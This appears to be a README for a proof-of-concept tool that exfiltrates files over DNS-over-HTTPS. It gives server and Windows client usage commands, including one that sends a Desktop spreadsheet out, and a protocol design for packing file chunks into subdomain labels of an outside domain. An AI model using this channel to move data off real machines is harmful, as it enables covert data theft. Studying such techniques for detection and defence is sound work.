# DoH-Fetch
Simple proof of concept project to exfiltrate files via DoH

# Usage
```bash
# server
sudo systemctl stop systemd-resolved.service
sudo python3 dnspad.py
# files are stored in directory: files/<date>_combined.bin
```
```powershell
# client
.\fetch.exe -f '.\Desktop\test.xlsx'
```
# Architecture
Client (C#) - fetch.exe - ran on the Windows machine
1. Disassemble file for chunks
2. Create HTTPS requests with DNS query inside with chunks 

Server (Python) - dnspad.py  - ran on the Linux server machine (public IP + domain)
0. Stop services running on port 53 (internet access)
1. Run DNS server on port 53
2. While getting DNS queries assemble chunks into a file

# RFC limitations
* Label / subdomain:  `63` characters maximum
* Full Domain: `255` characters maximum
* Total URL: `2,000` characters maximum 

# My protocol design
My limits: `a.abcdefghi.com` which is `15` chars 

File integrity ? chunk identification number

2 bytes for ID, how many maximum ID's ?
255 * 255 = 65,025 

`possibleID` * `databytes` = maximum file size (in bytes)
`65,025` * `228` = 14,825,700 -> around 15MB

<42data>.<62data>.<62data>.<62data>.<2id>.a.chromalin.com

42 + 186 + 2 + 1 +  9 + 3 = 243

'.' also counting -> 7 above

Total: `250` where `228` is data 

simple test.xslx excel file: `8.27` KB -> 8270 / 228 = 36.3, meaning `37` requests
